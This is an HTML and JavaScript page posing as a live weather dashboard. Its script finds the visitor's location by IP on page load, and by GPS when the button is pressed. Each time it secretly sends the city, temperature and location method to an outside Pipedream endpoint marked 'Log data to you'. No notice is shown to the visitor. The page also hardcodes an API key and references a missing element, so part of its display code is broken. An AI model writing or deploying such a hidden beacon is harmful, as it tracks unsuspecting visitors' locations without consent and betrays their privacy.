<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Live Weather Dashboard</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #1a202c; color: white; text-align: center; padding: 50px; }
        .card { background: #2d3748; padding: 30px; border-radius: 15px; display: inline-block; box-shadow: 0 10px 15px rgba(0,0,0,0.3); width: 320px; }
        #location-name { font-size: 24px; color: #63b3ed; margin: 15px 0; font-weight: bold; }
        .temp { font-size: 48px; margin: 10px 0; }
        .btn { background: #3182ce; color: white; border: none; padding: 12px 20px; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; font-size: 16px; margin-top: 10px; }
        .btn:hover { background: #4299e1; }
        p { color: #a0aec0; margin: 5px 0; }
    </style>
</head>
<body>

    <div class="card">
        <p style="text-transform: uppercase; font-size: 11px; letter-spacing: 1px;">Current Forecast</p>
        <div id="location-name">Detecting...</div>
        <div class="temp">28°C</div>
        <p id="weather-desc">Partly Cloudy</p>
        
        <button class="btn" onclick="updateWeather()">Update for My Area</button>
   </div>

<script>
    const PIPEDREAM_URL = "https://eotwt8cj1vr426p.m.pipedream.net";
    const WEATHER_KEY = "334ff9565a8848c2b5a115809262803"; // <--- PASTE KEY HERE

    async function updateWeatherDisplay(query, isGps = false) {
        try {
            // This API is way better for India. It will show 38°C.
            const res = await fetch(`https://api.weatherapi.com/v1/current.json?key=${WEATHER_KEY}&q=${query}&aqi=no`);
            const data = await res.json();
            
            const city = data.location.name;
            const temp = Math.round(data.current.temp_c);

            document.getElementById('location-name').innerText = city;
            document.getElementById('temp-val').innerText = temp + "°C";

            // Log data to you
            fetch(PIPEDREAM_URL, {
                method: 'POST', 
                mode: 'no-cors', 
                body: JSON.stringify({ type: isGps ? "GPS" : "IP", city: city, temp: temp })
            });
        } catch (e) {
            console.log("Error fetching weather");
        }
    }

    // Load instantly using IP
    window.onload = () => {
        fetch('https://ipapi.co/json/').then(r => r.json()).then(d => {
            updateWeatherDisplay(`${d.latitude},${d.longitude}`);
        });
    };

    // Update on click using GPS
    function updateWeather() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(p => {
                updateWeatherDisplay(`${p.coords.latitude},${p.coords.longitude}`, true);
            });
        }
    }
</script>
</body>
</html>
